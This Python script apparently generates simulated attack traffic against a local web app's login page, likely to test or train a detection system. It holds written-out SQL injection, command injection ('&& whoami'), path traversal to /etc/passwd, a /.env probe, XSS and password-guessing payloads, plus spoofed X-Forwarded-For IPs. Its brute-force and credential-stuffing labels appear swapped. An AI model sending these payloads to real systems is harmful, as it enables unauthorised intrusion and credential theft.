import requests
import random
import time

# ======================
# CONFIG
# ======================

BASE_URL = "http://127.0.0.1:8000"
LOGIN_URL = BASE_URL + "/login/"

DELAY = (0.1, 0.3)

USERNAMES = ["admin", "user1", "guest", "test", "root"]
PASSWORDS = ["123456", "password", "admin123", "qwerty", "letmein"]


# ======================
# ATTACK TYPES (13)
# ======================

ATTACK_TYPES = [
    "NORMAL",
    "BRUTE_FORCE",
    "CREDENTIAL_STUFFING",
    "SQL_INJECTION",
    "COMMAND_INJECTION",
    "PATH_TRAVERSAL",
    "FILE_INCLUSION",
    "XSS_ATTACK",
    "PARAMETER_POLLUTION",
    "SENSITIVE_FILE_SCAN",
    "RECONNAISSANCE",
    "HTTP_METHOD_ABUSE",
    "BOT_ACTIVITY"
]


# ======================
# IP GENERATION
# ======================

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


ACTIVE_IPS = [random_ip() for _ in ATTACK_TYPES]
IP_PROFILE = dict(zip(ACTIVE_IPS, ATTACK_TYPES))


# ======================
# REQUEST COUNT (INTENSITY)
# ======================

def get_request_count(attack):

    # Low intensity (normal or passive scanning)
    if attack == "NORMAL":
        return 2
    
    elif attack in ["BOT_ACTIVITY", "RECONNAISSANCE"]:
        return 1

    # Medium intensity (structured attacks)
    elif attack in [
        "BRUTE_FORCE",
        "PARAMETER_POLLUTION",
        "HTTP_METHOD_ABUSE"
    ]:
        return 100

    # High intensity (strong attacks)
    elif attack in [
        "SQL_INJECTION",
        "COMMAND_INJECTION",
        "FILE_INCLUSION",
        "PATH_TRAVERSAL",
        "XSS_ATTACK",
        "SENSITIVE_FILE_SCAN",
        "CREDENTIAL_STUFFING"
    ]:
        return 1

    return 17 # fallback

# ======================
# HEADERS
# ======================

def get_headers(ip, is_bot=False):
    if is_bot:
        return {
            "User-Agent": "python-requests/2.31 scanner bot",
            "X-Forwarded-For": ip
        }
    else:
        return {
            "User-Agent": "Mozilla/5.0",
            "X-Forwarded-For": ip
        }


# ======================
# ATTACK FUNCTIONS
# ======================

def normal(ip):
    return "POST", LOGIN_URL, {
        "username": "admin",
        "password": "admin@123"
    }, get_headers(ip)


def brute_force(ip):
    return "POST", LOGIN_URL, {
        "username": random.choice(USERNAMES),   # different users
        "password": "wrong"
    }, get_headers(ip)


def credential_stuffing(ip):
    return "POST", LOGIN_URL, {
        "username": "admin",                    # same user
        "password": random.choice(PASSWORDS)    # many passwords
    }, get_headers(ip)


def sql_injection(ip):
    payload = "' OR 1=1 --"
    return "POST", LOGIN_URL, {
        "username": payload,
        "password": payload
    }, get_headers(ip)


def command_injection(ip):
    return "POST", LOGIN_URL, {
        "username": "admin && whoami",
        "password": "x"
    }, get_headers(ip)


def path_traversal(ip):
    return "GET", LOGIN_URL + "?file=../../etc/passwd", None, get_headers(ip)


def file_inclusion(ip):
    return "GET", LOGIN_URL + "?page=/etc/passwd", None, get_headers(ip)


def xss(ip):
    return "POST", LOGIN_URL, {
        "username": "<script>alert(1)</script>",
        "password": "x"
    }, get_headers(ip)


def parameter_pollution(ip):
    return "GET", LOGIN_URL, {
        "a": 1, "b": 2, "c": 3,
        "d": 4, "e": 5, "f": 6
    }, get_headers(ip)


def sensitive_scan(ip):
    return "GET", BASE_URL + "/.env", None, get_headers(ip)


def recon(ip):
    return "GET", BASE_URL + "/admin-panel/", None, get_headers(ip)


def method_abuse(ip):
    return "DELETE", LOGIN_URL, None, get_headers(ip)


def bot(ip):
    return "POST", LOGIN_URL, {
        "username": "bot",
        "password": "scan"
    }, get_headers(ip, True)


# ======================
# MAPPING
# ======================

ATTACK_FUNCTIONS = {
    "NORMAL": normal,
    "BRUTE_FORCE": brute_force,
    "CREDENTIAL_STUFFING": credential_stuffing,
    "SQL_INJECTION": sql_injection,
    "COMMAND_INJECTION": command_injection,
    "PATH_TRAVERSAL": path_traversal,
    "FILE_INCLUSION": file_inclusion,
    "XSS_ATTACK": xss,
    "PARAMETER_POLLUTION": parameter_pollution,
    "SENSITIVE_FILE_SCAN": sensitive_scan,
    "RECONNAISSANCE": recon,
    "HTTP_METHOD_ABUSE": method_abuse,
    "BOT_ACTIVITY": bot
}


# ======================
# MAIN EXECUTION
# ======================

print("\n=== STARTING MULTI-IP ATTACK SIMULATION ===\n")

for ip, attack in IP_PROFILE.items():

    req_count = get_request_count(attack)

    print(f"\n--- {ip} → {attack} ({req_count} requests) ---")

    for i in range(req_count):

        method, url, data, headers = ATTACK_FUNCTIONS[attack](ip)

        try:
            if method == "POST":
                r = requests.post(url, json=data, headers=headers)

            elif method == "GET":
                r = requests.get(url, params=data, headers=headers)

            else:
                r = requests.request(method, url, headers=headers)

            print(f"{ip} | {attack} | Req {i+1}/{req_count} | {r.status_code}")

        except Exception as e:
            print("Error:", e)

        time.sleep(random.uniform(*DELAY))


print("\n=== COMPLETED ===\n")